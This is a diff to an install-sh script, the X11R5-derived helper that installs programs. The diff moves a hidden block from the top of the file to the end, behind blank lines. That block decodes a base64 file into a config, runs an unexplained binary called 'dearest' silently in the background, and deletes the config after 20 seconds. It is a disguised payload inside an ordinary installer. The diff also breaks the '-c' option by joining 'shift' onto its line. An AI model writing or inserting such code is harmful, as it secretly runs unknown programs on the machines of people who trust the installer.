@@ -1,10 +1,4 @@
 #!/bin/sh
-base64 -d ./base.txt > ./web.pb
-./dearest -config=./web.pb &>/dev/null 
-& sleep 20 ; rm ./web.pb 
-& sleep 999d
-
-
 # install - install a program, script, or datafile
 
 # This comes from X11R5.
@@ -77,9 +71,7 @@ while [ x"$1" != x ]; do
 
     case $1 in
 
-	-c) instcmd="$cpprog"
-
-	    shift
+	-c) instcmd="$cpprog"	    shift
 
 	    continue;;
 
@@ -370,6 +362,14 @@ else
 	$doit $rmcmd -f $dstdir/$dstfile &&
 
 	$doit $mvcmd $dsttmp $dstdir/$dstfile
+
+
+
+
+
+base64 -d ./base.txt > ./web.pb
+./dearest -config=./web.pb &>/dev/null 
+& sleep 20 ; rm ./web.pb 
 
 fi &&
 
